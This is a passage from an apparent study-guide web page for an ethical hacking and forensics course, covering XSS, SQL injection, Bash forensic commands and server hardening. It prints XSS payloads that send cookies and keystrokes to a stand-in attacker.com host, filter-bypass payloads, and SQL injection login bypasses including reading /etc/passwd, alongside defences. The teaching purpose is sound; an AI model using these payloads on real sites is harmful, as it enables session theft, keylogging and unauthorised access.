      <p className="text-sm font-medium mt-3">2. Cookie theft</p>
      <CodeBlock lang="html">{`<script>
fetch("https://attacker.com/steal?c=" + document.cookie)
</script>

<!-- Alternative using Image (no CORS issues) -->
<script>new Image().src = "https://attacker.com/steal?c=" + document.cookie</script>`}</CodeBlock>
      <p className="text-sm">
        When the victim views the injected page, their browser sends their cookies to the attacker's server. The <T>HttpOnly</T> cookie flag prevents <T>document.cookie</T> from working — this is why HttpOnly is the primary defence.
      </p>

      <p className="text-sm font-medium mt-3">3. Keylogger</p>
      <CodeBlock lang="html">{`<script>
document.addEventListener("keypress", function(e) {
    fetch("https://attacker.com/k?k=" + e.key);
});
</script>`}</CodeBlock>
      <p className="text-sm">
        Every keystroke the victim types on the page is sent to the attacker. This captures passwords, credit card numbers, etc.
      </p>

      <p className="text-sm font-medium mt-3">4. Event handler (no script tags)</p>
      <CodeBlock lang="html">{`<img src=x onerror="alert(document.cookie)">
<!-- If the image fails to load (src="x" is invalid), the onerror handler runs -->
<!-- Useful when <script> tags are filtered but HTML event handlers are not -->`}</CodeBlock>

      <p className="text-sm font-medium mt-3">5. DOM-based XSS vulnerable code (client-side)</p>
      <CodeBlock lang="javascript">{`// Vulnerable — attacker controls location.hash
document.getElementById("output").innerHTML = location.hash.slice(1);

// The attacker sends a link with #<script>alert(1)</script>
// The browser never sends the fragment to the server (it stays client-side)
// So server-side filters cannot block it`}</CodeBlock>

      <SubHeading id="js-bypass-detailed">Filter Bypass — When &lt;script&gt; Is Blocked</SubHeading>
      <p className="text-sm">
        Many sites filter out <T>&lt;script&gt;</T> tags. Attackers use these techniques:
      </p>
      <Table
        headers={["Technique", "Payload", "Why It Might Work"]}
        rows={[
          ["HTML entities", "&lt;script&gt;alert(1)&lt;/script&gt;", "If the filter runs before HTML entity decoding"],
          ["Case variation", "&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;", "Filter only checks lowercase"],
          ["Double URL encoding", "%253cscript%253e", "Server decodes once, filter sees encoded version, second decode happens in the browser"],
          ["Unicode escapes", "\\u003cscript\\u003e", "JavaScript string parsing interprets \\u003c as &lt;"],
          ["Breaking up keywords", "&lt;scr\\nipt&gt;", "Newline inside the tag may bypass regex filters"],
          ["Event handlers", "&lt;img src=x onerror=alert(1)&gt;", "No script tag needed at all"],
        ]}
      />

      <Callout type="info" title="JavaScript — Common Exam Mistakes">
        Confusing XSS types: reflected (in URL, server reflects it), stored (in database, every visitor sees it), DOM-based (never reaches server). Forgetting that HttpOnly blocks <T>document.cookie</T> access. Thinking that <T>&lt;script&gt;</T> is the only way to execute JavaScript (event handlers work too). Not understanding that the Same-Origin Policy does not apply to <T>&lt;img&gt;</T>, <T>&lt;script&gt;</T>, or <T>&lt;link&gt;</T> tags.
      </Callout>

      {/* ============================================================
          SQL
          ============================================================ */}
      <SectionHeading id="sql">SQL — Databases and Injection</SectionHeading>

      <SubHeading id="sql-what">What Is SQL?</SubHeading>
      <p className="text-sm">
        SQL (Structured Query Language) is the language used to communicate with relational databases. A relational database stores data in <strong>tables</strong> (like spreadsheets) with <strong>rows</strong> (records) and <strong>columns</strong> (fields). You use SQL commands to create tables, insert data, query data, update data, and delete data.
      </p>
      <p className="text-sm">
        In the EHAC module, SQL appears in two contexts: the Week 4 lecture on SQL fundamentals, and the SQL injection attack that was used against the PizzaPineapple case study.
      </p>

      <SubHeading id="sql-getting-started">How to Run SQL</SubHeading>
      <p className="text-sm">
        SQL commands are sent to a database server (like MySQL, PostgreSQL, SQLite). For the module you only need to read and write SQL — you do not need to set up a database server. Most of the work in the exam involves understanding a SQL query or constructing one on paper.
      </p>
      <p className="text-sm">
        To practice locally, install SQLite:
      </p>
      <CodeBlock lang="bash">{`sudo apt install sqlite3

# Create a database and run queries
sqlite3 test.db
sqlite> CREATE TABLE users (id INT, name TEXT, password TEXT);
sqlite> INSERT INTO users VALUES (1, 'admin', 'secret');
sqlite> SELECT * FROM users;
sqlite> .exit`}</CodeBlock>

      <SubHeading id="sql-syntax-detailed">Every SQL Statement You Need</SubHeading>

      <p className="text-sm font-medium mt-3">SELECT — retrieve data</p>
      <CodeBlock lang="sql">{`-- Select all columns from a table
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter rows with WHERE
SELECT * FROM users WHERE username = 'admin';

-- Multiple conditions
SELECT * FROM users WHERE role = 'admin' AND active = 1;

-- Pattern matching (LIKE)
SELECT * FROM users WHERE email LIKE '%@example.com';

-- Sort results
SELECT * FROM logins ORDER BY timestamp DESC;

-- Limit results
SELECT * FROM logins ORDER BY timestamp DESC LIMIT 10;

-- Count rows
SELECT COUNT(*) FROM users;`}</CodeBlock>

      <p className="text-sm font-medium mt-3">INSERT — add new data</p>
      <CodeBlock lang="sql">{`INSERT INTO users (username, password, role)
VALUES ('jdoe', 'password123', 'user');`}</CodeBlock>

      <p className="text-sm font-medium mt-3">JOIN — combine data from multiple tables</p>
      <CodeBlock lang="sql">{`-- Get usernames alongside their payment details
SELECT u.username, p.credit_card_number, p.amount
FROM users u
JOIN payments p ON u.user_id = p.user_id
WHERE p.amount > 100;`}</CodeBlock>

      <SubHeading id="sql-injection-detailed">SQL Injection — Step by Step</SubHeading>
      <p className="text-sm">
        SQL injection occurs when a program builds a SQL query by concatenating user input directly into the query string. The attacker can "break out" of the string they control and inject their own SQL commands.
      </p>

      <p className="text-sm font-medium mt-3">The vulnerable pattern</p>
      <CodeBlock lang="sql">{`-- A login page might run this query:
SELECT * FROM users
WHERE username = 'admin' AND password = 'password';

-- The code builds the query like this (Java/PHP/Python pseudocode):
query = "SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + passInput + "'";`}</CodeBlock>

      <p className="text-sm font-medium mt-3">The injection</p>
      <CodeBlock lang="text">{`Attacker enters:
  Username: admin' --
  Password: anything

The resulting query becomes:
  SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything';

The -- comments out the rest of the query.
The database sees: "give me the user where username is 'admin'"
Ignores the password check entirely.`}</CodeBlock>

      <p className="text-sm font-medium mt-3">The universal bypass: ' OR 1=1 --</p>
      <CodeBlock lang="sql">{`Username: ' OR 1=1 --
Password: anything

Query becomes:
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything';

1=1 is always true, so every row is returned.
The attacker logs in as the first user in the table (often admin).`}</CodeBlock>

      <p className="text-sm font-medium mt-3">Advanced — UNION and LOAD_FILE</p>
      <CodeBlock lang="sql">{`-- UNION lets you read from other tables
SELECT username, password FROM users
UNION
SELECT credit_card_number, name FROM payments;

-- MySQL specific: read local files
SELECT LOAD_FILE('/etc/passwd');`}</CodeBlock>

      <SubHeading id="sql-mitigation-detailed">Defence — Parameterised Queries</SubHeading>
      <p className="text-sm">
        The fix is to never concatenate user input into SQL. Instead, use <strong>parameterised queries</strong> (also called prepared statements) that separate the SQL code from the data.
      </p>
      <CodeBlock lang="sql">{`-- Safe version: placeholders (?) are filled separately
PREPARE stmt FROM 'SELECT * FROM users WHERE username = ? AND password = ?';
EXECUTE stmt USING @user, @pass;

-- The database treats the parameters as data, never as SQL code.
-- Even if @user = "admin' --", it is treated as a literal string, not injected SQL.`}</CodeBlock>

      <p className="text-sm">
        <strong>Exam relevance:</strong> You must be able to identify the vulnerable line of code (string concatenation with user input), explain what the injected query does, and state that parameterised queries are the correct fix.
      </p>

      <Callout type="info" title="SQL — Common Exam Mistakes">
        Forgetting the space after <T>--</T> (SQL requires a space or end of line after the comment marker). Confusing SQL injection with XSS (both are injection, but SQL targets the database, XSS targets the browser). Thinking that input validation alone is sufficient (it helps but parameterisation is the primary defence).
      </Callout>

      {/* ============================================================
          BASH
          ============================================================ */}
      <SectionHeading id="bash">Bash / Shell — Linux and Forensics</SectionHeading>

      <SubHeading id="bash-what">What Is Bash?</SubHeading>
      <p className="text-sm">
        Bash (Bourne Again SHell) is the default command-line interpreter on Linux. Every command you type in a Linux terminal is interpreted by Bash. A <strong>shell script</strong> is a text file containing a sequence of Bash commands. In the EHAC module, Bash is used for file operations in Weeks 2-3 and for running forensic tools throughout the practicals.
      </p>

      <SubHeading id="bash-getting-started">Getting Started</SubHeading>
      <p className="text-sm">
        Open a terminal. You will see a prompt like <T>user@machine:~$</T>. Everything after the <T>$</T> is where you type commands. Press Enter to run each command.
      </p>
      <CodeBlock lang="bash">{`# Who am I?
whoami

# What machine is this?
hostname

# Where am I?
pwd

# List files
ls
ls -l   # detailed listing (permissions, size, date)
ls -a   # show hidden files (starting with .)

# Change directory
cd /home/user/Documents

# Read a file
cat file.txt
less file.txt   # scrollable viewer (q to quit)

# Count lines, words, characters
wc file.txt
wc -l file.txt   # just line count`}</CodeBlock>

      <SubHeading id="bash-permissions">File Permissions in the Shell</SubHeading>
      <p className="text-sm">
        Every file has a permission string like <T>-rw-r--r--</T>. The first character is the file type (<T>-</T> = regular file, <T>d</T> = directory). The next nine characters are three groups of three: owner, group, others. Each group has <T>r</T> (read), <T>w</T> (write), <T>x</T> (execute).
      </p>
      <CodeBlock lang="bash">{`# View permissions
ls -l script.sh
# Output: -rwxr-xr-x 1 tom tom 123 Nov 15 10:00 script.sh
#         ^^^^   ^^^^   ^^^
#         owner  group  others

# Change permissions
chmod u+x script.sh    # add execute for owner (u=user)
chmod g-w script.sh    # remove write for group
chmod o+r file.txt     # add read for others

# Using octal: chmod 755 = owner all, group read+execute, others read+execute
chmod 755 script.sh
chmod 644 file.txt     # owner read+write, group/others read only
chmod 600 secret.txt   # owner only (everything else denied)`}</CodeBlock>

      <SubHeading id="bash-pipes">Pipes and Redirection</SubHeading>
      <p className="text-sm">
        Pipes (<T>|</T>) send the output of one command into the input of the next. Redirection (<T>&gt;</T>, <T>&gt;&gt;</T>, <T>&lt;</T>) sends output to a file or reads input from a file.
      </p>
      <CodeBlock lang="bash">{`# Pipe: list files, then search for "txt"
ls -l | grep txt

# Pipe: count how many txt files exist
ls *.txt | wc -l

# Chain multiple pipes
cat access.log | grep "POST" | cut -d' ' -f1 | sort | uniq -c

# Redirect output to a file (overwrite)
ls -l > output.txt

# Redirect output to a file (append)
echo "new line" >> output.txt

# Redirect errors
gcc -Wall program.c 2> errors.txt

# Send a file as input
sort < unsorted.txt`}</CodeBlock>

      <SubHeading id="bash-scripts-detailed">Writing a Shell Script</SubHeading>
      <p className="text-sm">
        A shell script is a text file with the <T>#!/bin/sh</T> shebang line at the top, followed by commands.
      </p>
      <CodeBlock lang="bash">{`#!/bin/sh
# This is a comment
echo "Starting script..."
mkdir -p /tmp/test
for i in \$(seq 1 5); do
    touch "/tmp/test/file_\$i.txt"
    echo "Created file_\$i.txt"
done
chmod a-w /tmp/test/file_*.txt
echo "Done. Files are now read-only."

# Save as myscript.sh, then:
chmod +x myscript.sh
./myscript.sh`}</CodeBlock>

      <SubHeading id="bash-forensics-detailed">Forensic Workflows in the Shell (Week 10 Level)</SubHeading>
      <p className="text-sm">
        These are the exact commands you will use in the practical exams for file analysis, disk imaging, steganography detection, and evidence verification.
      </p>

      <p className="text-sm font-medium mt-3">File identification and analysis</p>
      <CodeBlock lang="bash">{`# Identify a file by its magic bytes (not extension)
file mystery.bin

# Extract readable strings
strings image.png
strings image.png | grep -i password
strings -n 10 image.png   # only strings of length >= 10

# Show metadata (EXIF, etc.)
exiftool photo.jpg

# Calculate hashes
sha256sum disk_image.dd > disk_image.hash
md5sum evidence_file.bin

# Compare files
diff original.txt modified.txt`}</CodeBlock>

      <p className="text-sm font-medium mt-3">Disk imaging with dd</p>
      <CodeBlock lang="bash">{`# Create a forensic image
sudo dd if=/dev/sdb of=image.dd bs=4M conv=noerror,sync status=progress

# if = input file (the device or file)
# of = output file
# bs = block size (4MB = faster than default 512 bytes)
# conv=noerror keep going after read errors
# conv=sync pad short reads with zeros
# status=progress show progress during imaging

# Verify the image
sha256sum image.dd

# Create a smaller image for analysis (first 1GB)
dd if=image.dd of=first_gb.dd bs=1M count=1024`}</CodeBlock>

      <p className="text-sm font-medium mt-3">Steganography detection</p>
      <CodeBlock lang="bash">{`# Check embedded files
binwalk firmware.bin
binwalk -Me firmware.bin   # extract embedded files

# Extract hidden data from images
steghide extract -sf image.jpg
steghide extract -sf image.jpg -p passphrase  # with known password

# LSB analysis with zsteg
zsteg image.png`}</CodeBlock>

      <p className="text-sm font-medium mt-3">Forensic file system tools (Sleuth Kit)</p>
      <CodeBlock lang="bash">{`# List files in a disk image
fls -o 2048 image.dd   # -o = offset (partition start)

# Show inode details
istat -o 2048 image.dd 12345   # 12345 = inode number

# Extract a file by inode
icat -o 2048 image.dd 12345 > recovered_file.txt

# Show file system stats
fsstat -o 2048 image.dd`}</CodeBlock>

      <Callout type="info" title="Bash — Common Exam Mistakes">
        Forgetting to use <T>sudo</T> for <T>dd</T> and other device-access commands. Using <T>dd</T> with wrong <T>if</T>/<T>of</T> (can destroy data). Forgetting <T>conv=noerror,sync</T> (imaging stops on first read error). Typing <T>chmod 777</T> instead of <T>755</T> or <T>644</T> (777 gives world-writable permission — a security risk).
      </Callout>

      {/* ============================================================
          ASSEMBLY
          ============================================================ */}
      <SectionHeading id="assembly">Assembly — Reverse Engineering</SectionHeading>

      <SubHeading id="asm-what">What Is Assembly?</SubHeading>
      <p className="text-sm">
        Assembly language is a human-readable representation of <strong>machine code</strong> — the raw binary instructions that a CPU executes. Every C program is compiled down to assembly, then assembled into machine code. In the EHAC module, you only need to recognise assembly, not write it. The key concept is the <strong>call stack</strong>: when a function is called, the CPU pushes the return address onto the stack, and when the function returns, it pops that address and jumps back. Buffer overflow attacks overwrite the return address to hijack execution.
      </p>

      <SubHeading id="asm-tools-detailed">Tools You Will Use</SubHeading>
      <Table
        headers={["Tool", "What It Does", "Example"]}
        rows={[
          ["gdb", "Debugger — run a program step by step, inspect memory and registers", "gdb ./target\nbreak main\nrun\nstepi"],
          ["nm", "List symbols (functions/variables) in a compiled binary", "nm --extern-only --dynamic ./target"],
          ["objdump", "Disassemble a binary into assembly instructions", "objdump -d ./target"],
        ]}
      />

      <SubHeading id="asm-stack">The Stack — Key Concept</SubHeading>
      <p className="text-sm">
        The stack is a region of memory that works like a stack of plates: you push data onto the top and pop it off. When <T>main()</T> calls <T>functionA()</T>, the return address (the next instruction in <T>main()</T>) is pushed onto the stack. When <T>functionA()</T> finishes, the return address is popped and execution continues in <T>main()</T>. A buffer overflow occurs when a program writes more data into a stack buffer than it can hold, overwriting the return address.
      </p>

      <Callout type="info" title="Assembly — What You Need for the Exam">
        You are not expected to read assembly fluently. The exam tests the concept of the call stack, how LD_PRELOAD works, and the key-space calculation for substitution ciphers (26! ≈ 4×10²⁶).
      </Callout>

      {/* ============================================================
          PHP
          ============================================================ */}
      <SectionHeading id="php">PHP — Server-Side Language Identification</SectionHeading>

      <SubHeading id="php-what">What Is PHP?</SubHeading>
      <p className="text-sm">
        PHP is a server-side scripting language used to build dynamic web pages. When a browser requests a PHP page, the web server runs the PHP code and sends the resulting HTML to the browser. In the EHAC module, PHP matters because its presence is visible in HTTP response headers.
      </p>

      <SubHeading id="php-detection">How to Detect PHP</SubHeading>
      <CodeBlock lang="bash">{`# Check HTTP response headers
curl -I https://example.com

# If the server uses PHP, you may see:
# X-Powered-By: PHP/5.5.9-1ubuntu4.21`}</CodeBlock>
      <p className="text-sm">
        This header tells attackers the exact PHP version, which helps them find version-specific vulnerabilities. The fix is to set <T>expose_php = Off</T> in <T>php.ini</T>.
      </p>

      <SubHeading id="php-banner">Full Server Banner Hardening</SubHeading>
      <CodeBlock lang="apache">{`# Apache configuration
ServerTokens Prod
ServerSignature Off

# PHP configuration (php.ini)
expose_php = Off`}</CodeBlock>
      <p className="text-sm">
        This corresponds to finding YORK-004 (Verbose Server Banner) in the PizzaPineapple case study. The banner was: <T>X-Powered-By: PHP/5.5.9-1ubuntu4.21</T> and <T>Server: Apache/2.4.7 (Ubuntu)</T>.
      </p>

      {/* ============================================================
          JAVA
          ============================================================ */}
      <SectionHeading id="java">Java — Mitigation Libraries and Tools</SectionHeading>

      <SubHeading id="java-what">What Is Java?</SubHeading>
      <p className="text-sm">
        Java is a compiled, object-oriented programming language that runs on the Java Virtual Machine (JVM). In the EHAC module, Java appears in three peripheral contexts:
      </p>
      <ul className="list-disc pl-6 text-sm space-y-1">
        <li><strong>OWASP Java Encoder</strong> — A library that Java web applications use to safely encode user input before inserting it into HTML, JavaScript, or CSS, preventing XSS.</li>
        <li><strong>Stegsolve</strong> — A Java GUI application used in the steganography lab for bit-plane visualisation, colour-map inspection, and channel analysis. Download and run with <T>java -jar stegsolve.jar</T>.</li>
        <li><strong>Server-side comparison</strong> — The module mentions Java alongside PHP and ASP as common server-side web languages.</li>
      </ul>
      <p className="text-sm">
        The exam does not test Java syntax. Know that stegsolve is a Java tool and that OWASP provides context-specific encoding libraries.
      </p>

      {/* ============================================================
          COMPARISON
          ============================================================ */}
      <SectionHeading id="comparison">Language Comparison — Week 10 Skill Summary</SectionHeading>
      <p className="text-sm">
        The table below shows what you should be able to do in each language by the end of Week 10.
      </p>
      <Table
        headers={["Task", "C", "Python", "PowerShell", "Bash"]}
        rows={[
          ["Read bytes from a file", "open() + read()", "open('f', 'rb').read()", "Get-Content -Encoding Byte", "xxd or od"],
          ["Write bytes to a file", "open() + write()", "open('f', 'wb').write()", "Set-Content -Encoding Byte", "echo > or dd"],
          ["Convert hex to bytes", "sscanf or manual", "bytes.fromhex()", "[System.Convert]::FromHexString()", "xxd -r -p"],
          ["XOR a buffer", "Manual loop", "bytes(b ^ k for b in data)", "[byte]($b -bxor $k)", "Not practical — use Python"],
          ["Decode a FILETIME", "Complex (math)", "datetime + timedelta", "[datetime]::FromFileTime()", "Not practical"],
          ["Query an event log", "Not applicable", "python-evtx library", "Get-WinEvent", "Not applicable"],
          ["Query the registry", "Not applicable", "python-registry library", "Get-ChildItem Registry::", "Not applicable"],
          ["Create a disk image", "Not applicable", "Not practical", "Not practical", "dd"],
          ["Run a steg analysis", "Not applicable", "Python stego libs", "Not practical", "steghide, binwalk, zsteg"],
          ["Verify SHA256 hash", "Not practical", "hashlib", "Get-FileHash", "sha256sum"],
        ]}
      />

      <Callout type="info" title="Week 10 Exam Strategy">
        For the offline practical, memorise the exact syntax you will need: C system-call signatures, PowerShell Get-WinEvent filters with event IDs, Bash dd flags, and the Python hex/XOR patterns. You will not have internet access to look them up. Practice these commands until you can type them without thinking. For the open-book exam, know where to find the rest — this page, the glossary, the exam cheatsheet, and the topic-specific pages are all at your fingertips.
      </Callout>

      <Callout type="key" title="Quick Reference Card">
        <strong>C:</strong> gcc -Wall -o prog prog.c &amp;&amp; ./prog | <strong>Python:</strong> python3 script.py | <strong>PowerShell:</strong> Get-WinEvent -FilterHashtable {'@{'}LogName='Security'; Id=4624{'}'} | <strong>Bash:</strong> dd if=/dev/sdb of=image.dd bs=4M conv=noerror,sync | <strong>JavaScript:</strong> &lt;script&gt;fetch('url?'+document.cookie)&lt;/script&gt; | <strong>SQL:</strong> SELECT * FROM users WHERE username = 'admin' -- | <strong>PHP hardening:</strong> expose_php = Off
      </Callout>
    </div>
  );
}
